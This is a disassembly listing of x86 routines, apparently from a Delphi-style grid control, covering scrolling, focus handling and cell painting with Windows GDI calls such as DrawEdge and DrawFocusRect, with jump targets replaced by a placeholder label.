mov eax [ ebx + 0x228 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x22c ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x21c ]
mov [ ebp - 0x18 ] eax
mov edx [ ebx + 0x24c ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebx + 0x238 ]
mov [ ebp - 0x2c ] ecx
dec eax
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x23c ]
mov [ ebp - 0x28 ] eax
dec edx
mov [ ebp - 0x20 ] edx
xor edi edi
xor eax eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x4 ]
test esi esi
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
neg esi
push ebp
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebx + 0x220 ]
lea eax [ ebx + 0x21c ]
mov ecx [ ebx + 0x230 ]
call sub_474bc4
pop ecx
mov edi eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2c ] eax
add esi [ ebp - 0x8 ]
mov eax [ ebx + 0x258 ]
cmp esi eax
jg r-xdata
push ebp
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebx + 0x250 ]
lea eax [ ebx + 0x24c ]
mov ecx [ ebx + 0x234 ]
call sub_474bc4
pop ecx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
add esi [ ebp - 0x8 ]
mov eax [ ebx + 0x25c ]
cmp esi eax
jg r-xdata
push 0x1
lea ecx [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
mov eax ebx
call sub_476eb0
lea eax [ ebp - 0x3c ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
dec eax
mov [ ebp - 0x24 ] eax
dec eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax ebx
mov si 0xffa8
call sub_403368
mov eax [ ebp - 0x10 ]
cmp eax [ ebx + 0x228 ]
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push edi
mov eax ebx
call sub_446450
push eax
call ScrollWindow
mov eax ebx
call sub_446450
push eax
call UpdateWindow
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx eax
mov eax ebx
call sub_4776f4
mov edx [ ebp - 0xc ]
cmp edx [ ebx + 0x22c ]
je r-xdata
sub_474e48
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov esi eax
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_476eb0
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_474e98
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_474e48
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_474ecc
push ebx
mov ebx eax
mov ax [ ebx + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
xor eax eax
pop ebx
retn
cmp [ ebx + 0x28d ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_446754
test al al
je r-xdata
test [ ebx + 0x249 ] 0x20
jne r-xdata
mov al 0x1
pop ebx
retn
mov eax ebx
call sub_474f28
test al al
jne r-xdata
sub_474f28
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_457570
test eax eax
je r-xdata
call GetFocus
mov edi eax
jmp r-xdata
cmp esi [ eax + 0x220 ]
jne r-xdata
push edi
call IsWindow
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
jmp r-xdata
test bl bl
je r-xdata
cmp edi [ esi + 0x180 ]
jne r-xdata
push edi
call GetParent
mov edi eax
mov bl 0x1
jmp r-xdata
sub_474fc8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax edi
call sub_474fb8
mov esi [ edi + 0x27c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0x102
mov eax esi
call sub_446450
push eax
call PostMessageA
sub_47501c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_41c5b0
mov ebx [ edi + 0x21c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_41c5b8
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax ebp
call sub_41c500
mov ecx eax
mov edx esi
mov eax edi
call sub_479234
inc esi
dec ebx
jne r-xdata
sub_47505c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_41c5b0
mov ebx [ edi + 0x24c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_41c5b8
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax ebp
call sub_41c500
mov ecx eax
mov edx esi
mov eax edi
call sub_4795a4
inc esi
dec ebx
jne r-xdata
sub_47509c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_41ddfc
mov ebx [ edi + 0x21c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_41de04
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4790fc
mov edx eax
mov eax ebp
call sub_41dd88
inc esi
dec ebx
jne r-xdata
sub_4750dc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_41ddfc
mov ebx [ edi + 0x24c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_41de04
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_47911c
mov edx eax
mov eax ebp
call sub_41dd88
inc esi
dec ebx
jne r-xdata
sub_47511c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x220 ] 0x0
setne al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x220 ]
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x220 ]
call sub_474010
xor al 0x1
pop ebx
pop ebp
retn
sub_475160
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x250 ] 0x0
setne al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x250 ]
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x250 ]
call sub_474010
xor al 0x1
pop ebx
pop ebp
retn
sub_4751a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44370c
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x28f ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
push eax
push sub_47501c
mov eax [ ebp - 0x8 ]
push eax
push sub_47509c
push ebp
call sub_47511c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x8 ]
push eax
push sub_47505c
mov eax [ ebp - 0x8 ]
push eax
push sub_4750dc
push ebp
call sub_475160
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_475248
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x220 ] 0x0
je r-xdata
push edi
lea edx [ ebx + 0x228 ]
mov ecx esi
mov eax ebx
call sub_477638
push edi
lea edx [ ebx + 0x210 ]
mov ecx esi
mov eax ebx
call sub_477638
push edi
lea edx [ ebx + 0x280 ]
mov ecx esi
mov eax ebx
call sub_477638
xor eax eax
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_47918c
mov [ esp + 0xc ] eax
cmp edi esi
jle r-xdata
lea ecx [ edi + 0x1 ]
lea ebp [ esi + 0x1 ]
mov edx ebp
lea eax [ ebx + 0x220 ]
call sub_473fb8
lea ecx [ edi + 0x1 ]
mov edx ebp
lea eax [ ebx + 0x224 ]
call sub_473fb8
mov [ esp ] edi
mov [ esp + 0x8 ] esi
mov [ esp ] esi
mov [ esp + 0x8 ] edi
jmp r-xdata
mov eax ebx
call sub_479740
mov eax ebx
mov si 0xffa5
call sub_403368
mov edx esp
mov eax ebx
call sub_47702c
mov ecx edi
mov edx esi
mov eax ebx
mov si 0xffaa
call sub_403368
cmp [ ebx + 0x220 ] 0x0
je r-xdata
sub_475320
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
lea edx [ ebx + 0x22c ]
mov ecx esi
mov eax ebx
call sub_477638
push edi
lea edx [ ebx + 0x214 ]
mov ecx esi
mov eax ebx
call sub_477638
push edi
lea edx [ ebx + 0x284 ]
mov ecx esi
mov eax ebx
call sub_477638
mov ecx edi
mov edx esi
mov eax ebx
mov si 0xffa9
call sub_403368
cmp [ ebx + 0x250 ] 0x0
je r-xdata
lea ecx [ edi + 0x1 ]
lea edx [ esi + 0x1 ]
lea eax [ ebx + 0x250 ]
call sub_473fb8
mov eax ebx
call sub_479740
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffa4
call sub_403368
sub_4753b0
push ebx
push esi
push edi
add esp 0xffffff90
mov edi ecx
mov esi edx
mov ebx eax
mov al [ ebx + 0x28e ]
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
cmp [ esp ] 0x0
setne al
add esp 0x70
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_476088
push esp
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xcc ]
sub_475408
push ebx
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x28d ] 0x0
je r-xdata
add esp 0x10
pop ebx
retn
cmp [ ebx + 0x27c ] 0x0
je r-xdata
push esp
mov ecx [ ebx + 0x22c ]
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_474e98
mov edx esp
mov eax [ ebx + 0x27c ]
call sub_474954
sub_475454
pop ecx
mov edx esp
add eax 0x3
and eax 0xfffffffc
cmp eax 0xffc
jle r-xdata
sub esp eax
mov eax esp
push edx
mov edx esp
sub edx 0x4
push edx
push ecx
retn
sub esp 0xffc
push eax
sub eax 0x1000
jns r-xdata
add eax 0x1000
sub_47549c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x208 ]
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x244 ]
mov eax [ esi + 0x10 ]
call sub_422024
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ esi + 0x10 ]
call sub_421ef8
mov eax [ ebp + 0xc ]
mov edx [ eax + 0xc ]
mov eax [ esi + 0x10 ]
call sub_421ef8
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x10 ] eax
mov edx edi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov edx [ edx + ecx * 4 ]
mov ecx [ ebx ]
shr ecx 0x1
add edx ecx
add eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403368
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x2c ] eax
mov eax [ esi + 0x10 ]
call sub_421ef0
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov eax [ esi + 0x10 ]
call sub_42201c
push eax
push 0x12200
call ExtCreatePen
mov edx eax
mov eax [ esi + 0x10 ]
call sub_421fb8
mov eax [ esi + 0x10 ]
call sub_42201c
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
xor eax 0x1
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov edx [ edx + eax * 4 ]
mov [ ebp - 0x18 ] edx
add eax 0x2
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov eax [ edx + eax * 4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x2
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov eax [ edx + eax * 4 ]
add eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0xc ]
shl eax 0x2
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x14 ]
jg r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
shr eax 0x2
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x10 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4229f0
push eax
call PolyPolyline
cmp edi [ ebx + 0x10 ]
jg r-xdata
inc edi
mov edx edi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
test eax eax
jg r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x20 ]
jle r-xdata
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x4 ]
xor eax 0x1
mov edx eax
add edx [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
mov [ ecx + edx * 4 ] esi
add [ ebp - 0xc ] 0x2
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x8 ]
mov [ ecx + edx * 4 ] esi
add eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
mov [ edx + eax * 4 ] ecx
add [ ebp - 0xc ] 0x2
sub_475684
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
mov eax [ eax ]
mov edx [ ebp + 0x14 ]
cmp eax [ edx + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp + 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x14 ]
cmp eax [ edx + 0xc ]
je r-xdata
test bl bl
jne r-xdata
push ebp
mov al [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x1c ]
add eax 0xffffff90
xor ecx ecx
mov edx esi
call sub_47549c
pop ecx
push ebp
push ebx
mov eax [ ebp + 0x1c ]
add eax 0xffffffc0
mov ecx 0x1
mov edx edi
call sub_47549c
pop ecx
push ebp
push ebx
mov eax [ ebp + 0x1c ]
add eax 0xffffffc0
mov ecx 0x1
mov edx edi
call sub_47549c
pop ecx
push ebp
mov al [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x1c ]
add eax 0xffffff90
xor ecx ecx
mov edx esi
call sub_47549c
pop ecx
jmp r-xdata
sub_475714
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x1c ]
add ebx 0xfffffffc
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x29 ] eax
jmp r-xdata
mov eax [ ebp - 0x29 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebx ]
mov eax [ eax + 0x24c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
mov edi [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2d ] eax
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
call sub_47911c
add eax [ ebp - 0x29 ]
mov [ ebp - 0x21 ] eax
jmp r-xdata
mov eax [ ebp - 0x2d ]
cmp eax [ ebp + 0x14 ]
jge r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x40 ]
add eax [ ebp - 0x21 ]
mov [ ebp - 0x29 ] eax
inc [ ebp - 0xc ]
mov eax [ ebx ]
cmp edi [ eax + 0x21c ]
jl r-xdata
mov eax [ ebx ]
mov edx edi
call sub_4790fc
add eax [ ebp - 0x2d ]
mov [ ebp - 0x25 ] eax
mov eax [ ebp - 0x25 ]
cmp eax [ ebp - 0x2d ]
jle r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x70 ]
add eax [ ebp - 0x25 ]
mov [ ebp - 0x2d ] eax
inc edi
lea eax [ ebp - 0x2d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_4229f0
push eax
call RectVisible
test eax eax
je r-xdata
mov al [ ebp + 0x8 ]
mov [ ebp - 0xd ] al
mov eax [ ebx ]
call sub_474f28
test al al
je r-xdata
mov eax [ ebp + 0x1c ]
lea ecx [ eax - 0x80 ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_473c20
test al al
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x22c ]
cmp eax [ ebp - 0xc ]
jne r-xdata
test [ ebp - 0xd ] 0x2
je r-xdata
or [ ebp - 0xd ] 0x1
mov eax [ ebx ]
cmp edi [ eax + 0x228 ]
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
jne r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x4
je r-xdata
or [ ebp - 0xd ] 0x2
mov eax [ ebx ]
mov esi [ eax + 0x208 ]
mov eax [ ebx ]
mov edx [ eax + 0x68 ]
mov eax esi
call sub_4228ec
test [ ebp - 0xd ] 0x1
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28d ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_4221f8
test [ ebp - 0xd ] 0x2
je r-xdata
lea eax [ ebp - 0x2d ]
push eax
mov al [ ebp - 0xd ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
test [ ebp - 0xd ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov edx 0xff00000d
call sub_4221f8
mov eax [ esi + 0xc ]
mov edx 0xff00000e
call sub_421a0c
jmp r-xdata
mov eax [ ebx ]
mov ax [ eax + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x1a5 ] 0x0
je r-xdata
lea edx [ ebp - 0x2d ]
mov eax esi
call sub_4225d0
test [ ebp - 0xd ] 0x2
je r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x84 ]
mov edx [ ebp + 0x1c ]
or eax [ edx - 0x88 ]
je r-xdata
mov eax [ ebx ]
mov ax [ eax + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
push edi
lea esi [ ebp - 0x2d ]
lea edi [ ebp - 0x3d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp + 0x1c ]
test [ eax - 0x84 ] 0x4
jne r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ ebp + 0x1c ]
test [ eax - 0x84 ] 0x8
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x70 ]
add [ ebp - 0x35 ] eax
jmp r-xdata
mov eax [ ebx ]
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x84 ]
push eax
push 0x4
lea eax [ ebp - 0x3d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_4229f0
push eax
call DrawEdge
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x88 ]
push eax
push 0x4
lea eax [ ebp - 0x3d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_4229f0
push eax
call DrawEdge
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x40 ]
add [ ebp - 0x31 ] eax
push edi
lea esi [ ebp - 0x2d ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x25 ]
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x15 ] eax
lea eax [ ebp - 0x1d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_4229f0
push eax
call DrawFocusRect
lea eax [ ebp - 0x2d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_4229f0
push eax
call DrawFocusRect
jmp r-xdata
sub_475a4a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff38
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
lea edi [ ebp - 0x70 ]
mov eax [ ebx ]
mov si 0xffc8
call sub_403368
test al al
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_4229cc
mov edx edi
mov eax [ ebx ]
call sub_476088
cmp [ edi ] 0x0
jg r-xdata
mov dl 0x1
mov eax [ ebx ]
call sub_476574
mov esi 0xc0c0c0
mov eax [ ebx ]
mov edx [ edi + 0x40 ]
sub edx [ eax + 0x25c ]
mov eax [ ebx ]
add edx [ eax + 0x23c ]
mov eax [ ebx ]
push [ eax + 0x258 ]
mov eax [ edi + 0x10 ]
pop ecx
sub eax ecx
mov ecx [ ebx ]
add eax [ ecx + 0x238 ]
call sub_428c48
add eax 0x3
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
shl eax 0x3
add eax eax
call sub_475454
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_475454
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov ecx 0x2
mov edx [ ebp - 0xc ]
call sub_475448
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
call sub_42154c
cmp eax 0xc0c0c0
jne r-xdata
cmp [ edi + 0x30 ] 0x0
jle r-xdata
push ebp
push 0x0
xor eax eax
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
xor ecx ecx
call sub_475684
pop ecx
push ebp
push 0x0
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
mov ecx [ ebx ]
mov ecx [ ecx + 0x258 ]
call sub_475684
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
push eax
xor eax eax
mov [ ebp - 0xc8 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x38 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
xor ecx ecx
call sub_475684
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc8 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x38 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push esi
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x4
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x8
setne al
mov ecx [ ebx ]
mov ecx [ ecx + 0x258 ]
call sub_475684
pop ecx
mov eax [ ebp - 0x10 ]
call sub_475484
mov eax [ ebp - 0x8 ]
call sub_475484
mov esi 0x808080
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
call sub_47913c
xor eax eax
mov [ ebp - 0x84 ] eax
xor eax eax
mov [ ebp - 0x88 ] eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
je r-xdata
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
je r-xdata
mov [ ebp - 0x84 ] 0x4
mov [ ebp - 0x88 ] 0x1
push ebp
push 0x0
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_475714
pop ecx
push ebp
push 0x0
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov ecx [ edi + 0x4 ]
sub ecx [ eax + 0x288 ]
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
xor edx edx
call sub_475714
pop ecx
push ebp
mov eax [ edi + 0x34 ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x38 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov edx [ eax + 0x25c ]
xor ecx ecx
xor eax eax
call sub_475714
pop ecx
push ebp
mov eax [ edi + 0x34 ]
push eax
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x38 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov ecx [ edi + 0x4 ]
sub ecx [ eax + 0x288 ]
mov eax [ ebx ]
mov edx [ eax + 0x25c ]
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
call sub_475714
pop ecx
